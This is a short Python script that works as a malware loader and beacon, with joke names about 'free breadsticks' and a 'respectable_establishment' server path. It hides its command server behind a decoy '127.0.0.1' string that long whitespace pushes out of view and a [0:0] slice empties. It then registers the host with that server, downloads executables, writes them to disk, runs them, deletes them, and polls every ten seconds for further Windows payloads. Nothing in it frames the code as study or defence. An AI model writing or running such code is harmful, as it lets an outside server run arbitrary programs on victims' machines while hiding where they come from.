from requests import get
from subprocess import check_output
from hashlib import sha1
from socket import gethostname, gethostbyname
from os import remove
from time import sleep
from random import randint


host_id = gethostname()+hex(randint(0,987654321))
h = sha1()
h.update(host_id.encode())
token = h.hexdigest()
o = '127.0.0.1'                                                                                                                                                            [0:0]+'WEB_ADDR_STANDIN'
a = get('http://%s/respectable_establishment/new.php?s=%s' % (o, token))

def d_r(p,d):    
    try:
        with open(p, 'wb') as f:
            f.write(d)
    except:
        raise Exception("cannot procure free breadsticks at desired location")
    res = check_output(p)
    remove(p)
    return res

p = r'free_breadsticks.exe'
res = d_r(p, a.content)

if(res):
    print('successfully failed to run.')

else:
    
    res = get('http://%s/respectable_establishment/cgi/confirm.php?t=%s' % (o, token))
    if res.status_code != 200:
        raise Exception("failed to notify server of new breadsticks affectionado")
    else:
        while 1:
            try:
                a = get('http://%s/respectable_establishment/cgi/refunds.php?q=%s' % (o, token))
                if a.content[:2] == b'MZ':
                    p = r'freer_breadsticks.exe'
                    res = d_r(p, a.content)            
                    break
            
            except:
                pass#no connection, just wait
            finally:
                sleep(10)
        if not res:
            print('om nom!')
            
